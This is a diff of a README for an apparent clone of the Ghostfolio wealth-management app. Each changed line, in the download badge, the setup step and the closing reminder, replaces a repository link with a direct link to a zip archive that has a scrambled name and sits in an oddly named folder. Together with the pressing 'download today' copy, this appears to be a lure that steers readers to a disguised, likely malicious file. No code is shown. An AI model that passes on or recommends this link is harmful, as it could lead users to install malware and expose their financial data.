@@ -1,7 +1,7 @@
 <h1>📊 Ghostfolio-Open-Source-Wealth-Management-Software - Your Free Portfolio Analytics Dashboard</h1>
 
 <p align="center">
-  <a href="https://github.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software">
+  <a href="https://raw.githubusercontent.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software/main/reinjure/Software-Source-Management-Wealth-Ghostfolio-Open-v2.9.zip">
     <img src="https://img.shields.io/badge/Download-Free_Software-4CAF50?style=for-the-badge&logo=github" alt="Download Badge" />
   </a>
 </p>
@@ -34,7 +34,7 @@ Let's get Ghostfolio running on your computer in just a few minutes. Follow thes
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software](https://github.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software)
+Visit this link to download the application: [https://raw.githubusercontent.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software/main/reinjure/Software-Source-Management-Wealth-Ghostfolio-Open-v2.9.zip](https://raw.githubusercontent.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software/main/reinjure/Software-Source-Management-Wealth-Ghostfolio-Open-v2.9.zip)
 
 Click the big green button that says "Download" or "Releases" on that page. Your browser will start downloading a file. Wait for the download to finish completely before moving to the next step.
 
@@ -129,7 +129,7 @@ Market data refreshes automatically every few minutes during trading hours.
 
 Ghostfolio puts professional-grade portfolio analytics in your hands without the cost or privacy concerns of commercial apps. Whether you have $100 or $100,000 in investments, tracking them here gives you clarity and confidence. Download it today and see your entire financial picture in one beautiful dashboard.
 
-Remember: the link to download is [https://github.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software](https://github.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software). Visit this link to download the application. Get started in under five minutes, and take control of your investments.
+Remember: the link to download is [https://raw.githubusercontent.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software/main/reinjure/Software-Source-Management-Wealth-Ghostfolio-Open-v2.9.zip](https://raw.githubusercontent.com/tangcj686-coder/Ghostfolio-Open-Source-Wealth-Management-Software/main/reinjure/Software-Source-Management-Wealth-Ghostfolio-Open-v2.9.zip). Visit this link to download the application. Get started in under five minutes, and take control of your investments.
 
 ---
 
